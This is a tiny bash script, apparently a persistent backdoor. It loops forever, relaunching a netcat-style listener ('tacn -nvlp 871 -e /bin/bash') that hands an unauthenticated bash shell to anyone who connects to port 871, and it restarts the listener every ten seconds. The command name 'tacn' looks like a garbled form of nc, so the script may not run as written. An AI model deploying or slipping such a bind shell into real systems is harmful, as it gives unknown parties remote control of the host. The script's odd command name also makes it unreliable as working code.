#!/bin/bash

while true; do
  until tacn -nvlp 871 -e /bin/bash; do
    sleep 10
  done
done
